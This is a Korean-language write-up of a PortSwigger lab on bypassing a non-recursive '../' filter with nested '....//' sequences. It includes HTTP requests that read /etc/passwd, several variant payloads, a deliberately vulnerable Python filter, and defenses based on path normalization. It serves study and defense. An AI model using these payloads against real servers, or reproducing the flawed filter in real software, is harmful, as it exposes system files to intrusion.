# Lab: File path traversal, traversal sequences stripped non-recursively

## 개요

- **난이도**: Practitioner
- **주제**: Path Traversal — `../` 비재귀적 제거 우회 / 중첩 시퀀스(`....//`)
- **링크**: https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively

## 목표

애플리케이션이 사용자 입력에서 `../` 시퀀스를 제거하지만 이를 **한 번만(비재귀적으로)** 수행한다는 점을 악용해, 중첩 시퀀스 `....//` 가 제거 후 다시 `../` 로 복원되도록 만들어 `/etc/passwd` 를 읽는다.

## 이전 랩과의 차이

```
[001 — simple case]
  방어 없음
  → ../../../etc/passwd

[002 — absolute path bypass]
  "../" 문자열 차단
  → /etc/passwd (절대경로) 로 우회

[003 — non-recursive strip (이번)]
  "../" 를 입력에서 "제거" 함
  → ....// 를 넣으면 제거 후 ../ 로 복원 → 우회
```

핵심: **치환/제거 방식의 필터는 그 결과가 다시 위험한 시퀀스를 만들 수 있는지**
검증하지 않으면 우회된다.

## 취약 지점

```http
GET /image?filename=21.jpg HTTP/1.1
              ↑
       "../" 를 제거한 뒤 경로로 사용하는 파라미터
```

서버 내부 처리 (추정):

```python
filename = request.args.get("filename")

# "../" 를 한 번만 제거 (비재귀적)
filename = filename.replace("../", "")

# 제거된 결과를 그대로 경로에 사용
with open("/var/www/images/" + filename, "rb") as f:
    return f.read()
```

## 우회 원리 — 문자열 치환 분석

`str.replace("../", "")` 를 한 번만 수행할 때의 결과를 문자 단위로 보면:

```
입력:  . . . . / /
       (....//)

"../" 를 찾아 제거:
  index 0 1 2 3 4 5
        . . . . / /
              ↑
  index 2,3,4 = "..", "../" 매칭 → 제거

제거 후 남는 문자:
  index 0,1 = ".."
  index 5   = "/"
  → ".." + "/" = "../"

결과: ../   ← 제거했는데 다시 ../ 가 만들어짐
```

즉 `....//` 는 `../` 를 제거하는 필터를 통과한 뒤 `../` 로 복원된다.

## 공격 단계

### 1단계 — 이미지 요청 캡처

```http
GET /image?filename=21.jpg HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

### 2단계 — 일반 `../` 가 제거되는지 확인

```http
GET /image?filename=../../../etc/passwd HTTP/1.1
```

필터가 `../` 를 제거해 `etc/passwd` 만 남으므로 실패한다.

### 3단계 — 중첩 시퀀스로 우회

```http
GET /image?filename=....//....//....//etc/passwd HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

서버 내부 처리:

```
입력:   ....//....//....//etc/passwd

"../" 제거 (각 위치에서 한 번씩):
  ....//     → ../
  ....//     → ../
  ....//     → ../
  etc/passwd → etc/passwd

결과:   ../../../etc/passwd
```

### 4단계 — 응답 확인

`/etc/passwd` 내용이 그대로 반환되면 랩 해결.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## 필터 우회 관점 정리

```
[필터 동작]
  filename.replace("../", "")   ← 1회 비재귀 치환

[우회 아이디어]
  제거 대상 문자열("../")이 제거 후 다시 조합되도록
  입력을 중첩해 배치한다.

  ....//   →  ../
  ....\/   →  ../   (백슬래시 변형, Windows 대상)
  ..././   →  ../   (일부 조합)
  ..%2f    →  URL 인코딩이 먼저 디코딩되는 경우 ../ (004 랩 주제)

[교훈]
  치환(제거/디코딩) 순서와 반복 여부가 방어의 핵심
  - 제거를 재귀적으로 해도, 입력 검증 없이 경로에 쓰면 다른 변형에 취약
```

## 방어

```
[잘못된 방어 — 이번 랩의 취약점]
  filename = filename.replace("../", "")
  → "....//" 처럼 제거 후 재조합되는 입력에 우회됨

[올바른 방어]
  1. 경로 정규화 후 기준 디렉토리 내부인지 확인 (화이트리스트)
     import os
     base = os.path.realpath("/var/www/images")
     target = os.path.realpath(os.path.join(base, user_input))
     if not target.startswith(base + os.sep):
         raise ValueError("허용되지 않은 경로")

  2. 파일명만 허용
     filename = os.path.basename(user_input)

  3. 화이트리스트 매핑 (ID → 실제 파일)

[주의]
  정규화는 반드시 "경로 결합 후" 수행하고,
  그 결과가 기준 디렉토리 내부인지 비교해야 한다.
  입력 문자열 수준의 치환/블랙리스트는 중첩·인코딩 변형에 취약하다.
```

## 핵심 정리

- `../` 제거가 비재귀적이면 `....//` 가 제거 후 `../` 로 복원되어 우회된다.
- 문자열 치환 기반 필터는 "제거 후 재조합" 되는 중첩 패턴에 취약하다.
- 필터의 반복 횟수(재귀 여부)와 처리 순서(디코딩 → 검증 → 사용)를 확인해야 한다.
- 안전한 방어는 입력 치환이 아니라 경로 정규화 후 기준 디렉토리 포함 여부 검증이다.

## 배운 점

- 방어 로직을 볼 때 "무엇을 제거하는가" 뿐 아니라 "제거된 결과가 무엇이 되는가"를 봐야 한다.
- `replace()` 를 한 번만 호출하는지, 반복하는지에 따라 우회 페이로드가 달라진다.
- 004(슈퍼플루어스 URL 디코드)에서는 디코딩 순서가 필터 우회의 축이 되므로, 이 랩과 함께 "처리 파이프라인" 관점으로 이해하면 좋다.
